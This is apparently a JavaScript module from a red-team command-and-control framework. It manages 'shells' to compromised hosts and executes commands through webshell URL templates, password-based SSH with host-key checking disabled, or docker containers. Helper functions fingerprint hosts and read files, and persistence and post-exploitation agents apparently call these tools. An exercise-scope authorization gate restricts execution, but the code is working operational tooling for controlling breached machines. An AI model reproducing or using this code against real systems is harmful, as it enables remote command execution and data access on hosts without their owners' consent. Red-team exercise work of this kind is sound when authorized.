/**
 * Shell registry — C2 implant handles as first-class citizens.
 *
 * A "shell" = an operational channel to a compromised host produced by the
 * C2 agent (implant QA-passed + acceptance-stamped). Registered here with
 * its transport; the operator console and stage agents (persistence/postex)
 * execute through it — one transport, three consumers:
 *   1. Frontend terminal (operator types commands, SSH-like)
 *   2. `shell` agent tool (exec/read_file handed to persistence/postex)
 *   3. C2 agent itself (delivery bookkeeping)
 *
 * Authorization: every shell is bound to an authorized target + exercise
 * window (HVV scope file). exec() refuses outside scope — same hard gate
 * as c2-qa.py (exit discipline) but enforced server-side.
 *
 * Transports: 'local' (benchmark/dev: command runs in a designated sandbox
 * box) — real implant transports (jmreport/http channel) plug in later via
 * the same interface.
 */
import { randomUUID } from 'node:crypto';
import { mkdirSync, writeFileSync, readFileSync } from 'node:fs';
import { dirname as pdirname } from 'node:path';
import { execFile } from 'node:child_process';


function parseFormBody(tpl) {
  // "a=1&c={CMD}" → replace {CMD} already done; split into pairs
  const out = {};
  for (const kv of String(tpl).split('&')) {
    const [k, v = ''] = kv.split('=');
    out[decodeURIComponent(k)] = decodeURIComponent(v);
  }
  return out;
}

/** shells by id — persisted to disk on every mutation; replayed on boot. */
const shells = new Map();
const SHELL_SNAPSHOT = '/var/lib/spectre/tools/c2/shells.json';

function persistShells() {
  try {
    mkdirSync(pdirname(SHELL_SNAPSHOT), { recursive: true });
    writeFileSync(SHELL_SNAPSHOT, JSON.stringify([...shells.values()]));
  } catch { /* best-effort; bus audit is the source of truth */ }
}

function loadShells() {
  try {
    const arr = JSON.parse(readFileSync(SHELL_SNAPSHOT, 'utf8'));
    for (const sh of arr) shells.set(sh.id, sh);
    return arr.length;
  } catch { return 0; }
}
// Boot-time replay (restores across runtime restarts)
loadShells();

const MAX_OUT = 64 * 1024;

export function createShellRegistry({ bus, wal, listScope } = {}) {
  const audit = (kind, data) => {
    try { bus?.emit?.('shell-event', { kind, at: new Date().toISOString(), ...data }); } catch { /* bus optional */ }
  };

  function gate(shell) {
    // Server-side authorization: exercise window + target binding.
    const sc = listScope?.() ?? null;
    if (!sc) return { ok: false, error: 'scope 不可读:授权门配置缺失' };
    const now = new Date().toISOString().slice(0, 19) + 'Z';
    const inWindow = sc.window && sc.window.start <= now && now <= sc.window.end;
    const inTargets = Array.isArray(sc.targets) && sc.targets.includes(shell.target);
    if (!sc.targets?.length || !inWindow) return { ok: false, error: '授权门:窗口外或无目标(拒绝)' };
    if (!inTargets) return { ok: false, error: `授权门:目标 ${shell.target} 不在清单(拒绝)` };
    if (shell.expiresAt && now > shell.expiresAt) return { ok: false, error: 'shell 已过期(一次性纪律)' };
    return { ok: true };
  }

  function register({ name, target, transport = 'local', transportRef = '', note = '', tags = [], createdBy = 'operator', ttlHours = 24 }) {
    const id = 'sh-' + randomUUID().slice(0, 8);
    // 命名规范:<目标>-<面>-<权限> 建议(不强制,但重名/空名拒)
    const nm = String(name || '').trim();
    if (!nm) return { error: 'name 必填(建议格式 目标-面-权限,如 dc8-web-www)' };
    if ([...shells.values()].some(x => x.name === nm && x.status === 'active'))
      return { error: `同名活跃通道已存在: ${nm}(先 close 或换名)` };
        // transportRef 格式校验(register 时拦截,不留到 exec 才爆)
    const tr = String(transportRef || '');
    if (transport === 'web' && !tr.includes('{CMD}'))
      return { error: 'web transportRef 需含 {CMD} 占位(如 http://h/p.php?c={CMD}#MARK)' };
    if (transport === 'ssh' && !/^(.+?):(.*?)@([^:]+)(?::(\d+))?$/.test(tr))
      return { error: 'ssh transportRef 需 user:pass@host[:port]' };
    if (transport === 'local' && !tr)
      return { error: 'local transportRef 需 容器名[:用户] (如 pxlab:www-data)' };
    const sh = {
      id, name: name || id, target, transport, transportRef, note,
      tags: Array.isArray(tags) ? tags.slice(0, 8).map(String) : [],
      createdBy, createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + ttlHours * 3600e3).toISOString(),
      cmdCount: 0, lastActiveAt: null, status: 'active',
      tasks: [],          // tasking history (Mythic): {n, command, code, ms, at}
      host: null, user: null, os: null,  // auto-fingerprint (Sliver session meta)
    };
    if (sh.error) return sh;
    shells.set(id, sh); persistShells();
    audit('shell-register', { id, target, transport, createdBy, name: nm });
    return sh;
  }

  function list(f = {}) {
    let out = [...shells.values()];
    if (f.target) out = out.filter(x => x.target === f.target);
    if (f.transport) out = out.filter(x => x.transport === f.transport);
    if (f.tag) out = out.filter(x => (x.tags ?? []).includes(f.tag));
    if (f.name) out = out.filter(x => String(x.name).toLowerCase().includes(String(f.name).toLowerCase()));
    if (f.status) out = out.filter(x => x.status === f.status);
    return out;
  }

  function get(id) { return shells.get(id) ?? null; }

  function close(id) {
    const sh = shells.get(id);
    if (!sh) return { ok: false, error: 'shell 不存在' };
    sh.status = 'closed'; persistShells();
    audit('shell-close', { id });
    return { ok: true };
  }

  /**
   * Execute one command over the shell. Transport 'local' = run inside the
   * configured exec box (docker container) — benchmark-grade fidelity.
   * Returns { ok, stdout, stderr, code, ms }.
   */
  async function exec(id, command, { timeoutMs = 30_000, box = null } = {}) {
    const sh = shells.get(id);
    if (!sh) return { ok: false, error: 'shell 不存在' };
    if (sh.status !== 'active') return { ok: false, error: `shell 状态 ${sh.status}` };
    const g = gate(sh);
    if (!g.ok) return { ok: false, error: g.error };
    const t0 = Date.now();
    let stdout = '', stderr = '', code = 0;
    try {
      if (sh.transport === 'ssh') {
        // transportRef: "user:pass@host:port" — VM range channel (post-creds).
        const m = /^(.+?):(.*?)@([^:]+)(?::(\d+))?$/.exec(sh.transportRef || '');
        if (!m) return { ok: false, error: 'ssh transportRef 需 user:pass@host[:port]' };
        const [, u, pw, h, port] = m;
        const r = await new Promise((resolve) => {
          const tSecS = Math.max(1, Math.ceil(timeoutMs / 1000));
          execFile('sshpass', ['-p', pw, 'ssh', '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null', '-p', port || '22',
            `${u}@${h}`, `timeout -k 5 ${tSecS} bash -lc ` + JSON.stringify(command)],
            { timeout: timeoutMs, maxBuffer: MAX_OUT }, (err, so, se) =>
            resolve({ err, so: String(so ?? ''), se: String(se ?? ''), code: err ? (err.code ?? 1) : 0 }));
        });
        stdout = r.so; stderr = r.se; code = r.code;
        if (code === 124 || code === 137) stderr += '\n[timeout: 远端进程已被 timeout(1) 终止]';
        if (r.err?.killed) stderr += '\n[timeout]';
        if (r.err?.code === 'ERR_CHILD_PROCESS_STDIO_MAXBUFFER') {
          stderr += `\n[输出超 ${MAX_OUT}B 截断——管道 head/tail/grep 缩小范围后重取]`;
        }
      } else if (sh.transport === 'web') {
        // transportRef: full URL template with {CMD} placeholder, e.g.
        //   http://h/p.php?c={CMD}        (GET; CMD urlencoded)
        //   POST|http://h/p.php|c={CMD}   (POST body form-encoded)
        // Optional response delimiters after '#' as marker: ...{CMD}#MARK
        // — only text between <MARK> and </MARK> is returned (kills the
        // Joomla/WordPress page-prefix noise that caused two misreads).
        const spec = sh.transportRef || '';
        const [spec0, marker] = spec.split('#');
        const isPost = spec0.startsWith('POST|');
        const tpl = isPost ? spec0.slice(5) : spec0;
        if (!tpl.includes('{CMD}')) return { ok: false, error: 'web transportRef 需含 {CMD} 占位' };
        const enc = encodeURIComponent(command);
        const url = isPost ? tpl : tpl.replace('{CMD}', enc);
        const body = isPost ? tpl.replace('{CMD}', enc) : null;
        const ctl = new AbortController();
        const t = setTimeout(() => ctl.abort(), Math.min(timeoutMs, 60_000)); // hard kill
        try {
          const r = await fetch(url, {
            method: isPost ? 'POST' : 'GET',
            body: isPost ? new URLSearchParams(parseFormBody(body)) : undefined,
            headers: isPost ? { 'content-type': 'application/x-www-form-urlencoded' } : {},
            signal: ctl.signal,
          });
          let txt = await r.text();
          clearTimeout(t);
          if (marker) {
            const m1 = txt.indexOf('<' + marker + '>');
            const m2 = txt.indexOf('</' + marker + '>');
            if (m1 >= 0) txt = m2 > m1 ? txt.slice(m1 + marker.length + 2, m2) : txt.slice(m1 + marker.length + 2);
          }
          stdout = txt.slice(0, MAX_OUT); stderr = ''; code = r.ok ? 0 : 1;
        } catch (e) {
          clearTimeout(t);
          return { ok: false, error: 'webshell 通道异常(已硬杀): ' + e.message };
        }
      } else if (sh.transport === 'local') {
        // transportRef binds the shell to ONE exec box — commands land in
        // the compromised box, never the runtime host. Format "container"
        // (default user) or "container:user" (low-priv web compromise).
        const ref = sh.transportRef || 'spectre-sandbox';
        const [cbox, cuser] = ref.includes(':') ? ref.split(':') : [ref, null];
        // F18: 容器侧 timeout(1) 包裹——node 杀 docker CLI 不杀容器进程
        // (泄漏 bash+sleep),且 docker CLI 被 SIGTERM 后 err 为空导致超时
        // 谎报 code:0 ok:true。容器内 timeout 真杀进程并返回 124。
        const tSec = Math.max(1, Math.ceil(timeoutMs / 1000));
        const argv = cuser
          ? ['exec', '-u', cuser, cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command]
          : ['exec', cbox, 'timeout', '-k', '5', String(tSec), 'bash', '-lc', command];
        const res = await new Promise((resolve) => {
          execFile('docker', argv, { timeout: timeoutMs + 5_000, maxBuffer: MAX_OUT }, (err, so, se) =>
            resolve({ err, so: String(so ?? ''), se: String(se ?? '') }));
        });
        stdout = res.so; stderr = res.se;
        code = res.err ? (res.err.code ?? 1) : 0;
        if (code === 124 || code === 137) { stderr += '\n[timeout: 容器内进程已被 timeout(1) 终止]'; }
        if (res.err && res.err.killed) stderr += '\n[timeout]';
        if (res.err?.code === 'ERR_CHILD_PROCESS_STDIO_MAXBUFFER') {
          stderr += `\n[输出超 ${MAX_OUT}B 截断——管道 head/tail/grep 缩小范围后重取]`;
        }
      } else {
        return { ok: false, error: `transport ${sh.transport} 未接入(真实植入通道后续挂)` };
      }
    } catch (e) {
      return { ok: false, error: 'exec 异常: ' + e.message };
    }
    sh.cmdCount += 1; sh.lastActiveAt = new Date().toISOString();
    const task = { n: sh.cmdCount, command: command.slice(0, 500), code, ms: Date.now() - t0, at: sh.lastActiveAt };
    sh.tasks.push(task);
    if (sh.tasks.length > 100) sh.tasks.splice(0, sh.tasks.length - 100);
    audit('shell-exec', { id, target: sh.target, cmd: command.slice(0, 120), code, ms: task.ms });
    return { ok: code === 0, stdout: stdout.slice(0, MAX_OUT), stderr: stderr.slice(0, MAX_OUT), code, ms: task.ms, task };
  }

  /** Auto-fingerprint the host once (whoami/uname) — Sliver-style session meta. */
  async function fingerprint(id) {
    const sh = shells.get(id);
    if (!sh || sh.host) return sh;
    const u = await exec(id, 'id -un 2>/dev/null; uname -a 2>/dev/null | head -1');
    if (u.ok) {
      const [user, ...rest] = String(u.stdout).split('\n');
      sh.user = (user || '').trim() || null;
      sh.os = rest.join(' ').trim() || null;
      sh.host = sh.os ? String(sh.os).split(' ')[1] : null;
    }
    return sh;
  }

  /** Convenience: read one file through the shell (cat), for agent tool. */
  async function readFile(id, path) {
    const r = await exec(id, `cat -- ${JSON.stringify(path)} 2>&1 | head -c 65536`);
    return r;
  }

  return { register, list, get, close, exec, readFile, gate, fingerprint };
}
